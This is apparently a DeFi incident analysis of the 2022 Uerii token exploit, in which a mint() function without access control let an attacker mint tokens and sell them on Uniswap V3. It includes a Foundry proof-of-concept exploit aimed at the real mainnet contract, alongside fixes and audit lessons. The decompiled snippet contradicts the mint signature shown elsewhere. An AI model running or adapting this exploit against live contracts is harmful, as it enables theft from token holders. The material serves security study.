# Uerii — `mint()` Missing Access Control Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | Uerii Token |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~2,500 USDC |
| **Vulnerable Contract** | [0x418C24191aE947A78C99fDc0e45a1f96Afb254BE](https://etherscan.io/address/0x418C24191aE947A78C99fDc0e45a1f96Afb254BE) (UERII Token) |
| **Attack Contract** | [0xFD4DcCD754EAaA8C9196998c5Bb06A56dF6a1D95](https://etherscan.io/address/0xFD4DcCD754EAaA8C9196998c5Bb06A56dF6a1D95) |
| **Attacker** | [0xcc1A341D0F2a06Eaba436935399793F05C2bbE92](https://etherscan.io/address/0xcc1A341D0F2a06Eaba436935399793F05C2bbE92) |
| **USDC** | [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **Uniswap V3 Router** | [0xE592427A0AEce92De3Edee1F18E0157C05861564](https://etherscan.io/address/0xE592427A0AEce92De3Edee1F18E0157C05861564) |
| **Root Cause** | `mint()` function has no access control, allowing anyone to mint arbitrary amounts of UERII tokens |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/Uerii_exp.sol) |

---
## 1. Vulnerability Overview

The `mint()` function (line 493) of the UERII token contract was responsible for minting new tokens, but lacked an `onlyOwner` or equivalent access control modifier. The attacker directly called the unprotected `mint()` to mint a large quantity of UERII tokens, then sold them via Uniswap V3 in the order UERII → USDC → WETH to realize a profit. The loss was relatively small at ~2,500 USDC, but the damage to token credibility was severe.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable mint() - no access control (UERII Token line 493)
contract UERIIToken is ERC20 {
    // ❌ No onlyOwner or onlyMinter modifier
    // Anyone can call this and mint arbitrary amounts
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// ✅ Correct pattern 1 - onlyOwner
contract SafeUERIIToken is ERC20, Ownable {
    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }
}

// ✅ Correct pattern 2 - role-based access control
import "@openzeppelin/contracts/access/AccessControl.sol";

contract SafeUERIITokenWithRoles is ERC20, AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    constructor() {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(MINTER_ROLE, msg.sender);
    }

    function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**Uerii_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `mint()` function has no access control, allowing anyone to mint arbitrary amounts of UERII tokens
    function mint() external view returns (uint256) {}  // 0x1249c58b  // ❌ Unauthorized minting
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Call UERII.mint(attacker, largeAmount)
    │       ❌ No access control
    │       → Mint large amount of UERII to attacker address
    │
    ├─[2] Swap UERII → USDC (Uniswap V3, fee=500)
    │       Sell minted UERII for USDC
    │
    ├─[3] Swap USDC → WETH (Uniswap V3, fee=500)
    │
    └─[4] Net profit: ~2,500 USDC (received as WETH)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IUERII {
    // ❌ mint function with no access control
    function mint(address to, uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IUniV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params)
        external returns (uint256 amountOut);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract UERIIExploit is Test {
    IUERII uerii        = IUERII(0x418C24191aE947A78C99fDc0e45a1f96Afb254BE);
    IUniV3Router router = IUniV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IERC20 USDC         = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH         = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address USDC_ADDR = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_767_837);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC", USDC.balanceOf(address(this)), 6);

        // [Step 1] Directly call mint() with no access control
        // ⚡ Can mint large amounts with no conditions whatsoever
        uerii.mint(address(this), 1_000_000 * 1e18);

        emit log_named_decimal_uint("[After Mint] UERII", uerii.balanceOf(address(this)), 18);

        // [Step 2] UERII → USDC (Uniswap V3)
        uerii.approve(address(router), type(uint256).max);
        router.exactInputSingle(IUniV3Router.ExactInputSingleParams({
            tokenIn:           address(uerii),
            tokenOut:          USDC_ADDR,
            fee:               500,
            recipient:         address(this),
            deadline:          block.timestamp,
            amountIn:          uerii.balanceOf(address(this)),
            amountOutMinimum:  0,
            sqrtPriceLimitX96: 0
        }));

        // [Step 3] USDC → WETH (Uniswap V3)
        // (USDC approve + exactInputSingle)

        emit log_named_decimal_uint("[End] USDC", USDC.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[End] WETH", WETH.balanceOf(address(this)), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing access control on mint() function |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Access Control Vulnerability |
| **Attack Vector** | `mint(attacker, largeAmount)` → Uniswap V3 sell |
| **Precondition** | `mint()` function lacks `onlyOwner` or equivalent access control |
| **Impact** | ~2,500 USDC loss, token credibility destroyed |

---
## 6. Remediation Recommendations

1. **Add onlyOwner modifier**: Add `onlyOwner` or `onlyRole(MINTER_ROLE)` modifier to the `mint()` function so that only addresses trusted by the protocol can mint.
2. **Use OpenZeppelin ERC20Burnable/Mintable**: Reuse access control patterns from audited libraries to prevent mistakes in custom implementations.
3. **Disable mint() after deployment**: If minting is no longer needed after initial deployment, completely remove the `mint()` function or permanently disable it.

---
## 7. Lessons Learned

- **mint() always requires access control**: `mint()` is the most direct function for increasing token supply. Without access control, unlimited inflation attacks become possible, immediately destroying the token's economic value.
- **Small losses are still warning signs**: The ~2,500 USDC loss may appear minor, but had liquidity been greater, the damage would have been far worse. Vulnerability severity must be assessed by the nature of the flaw, not the dollar amount of the loss.
- **Token contract audit checklist**: In every token contract audit, first extract a list of privileged functions — `mint()`, `burn()`, `pause()`, `setOwner()`, etc. — and verify the access control on each one as a baseline step.